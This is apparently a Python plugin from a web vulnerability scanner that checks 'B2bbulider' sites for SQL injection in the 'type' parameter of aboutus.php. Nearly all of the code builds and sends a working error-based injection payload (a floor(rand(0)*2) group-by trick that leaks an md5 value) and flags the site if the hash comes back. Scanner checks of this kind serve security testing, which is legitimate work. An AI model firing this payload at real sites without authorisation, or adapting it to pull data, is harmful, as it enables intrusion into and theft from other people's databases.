#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "aboutus.php?type=1%27+aNd+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((Select+(md5(333))),1,62)))a+from+information_schema.tables+group+by+a)b)+and+%27z%27=%27z"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('1310dcbbf4cce62f762a2aaa148d556bd')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:B2bbulider_type_SqlinjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"FFile:B2bbulider_type_SqlinjectionScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def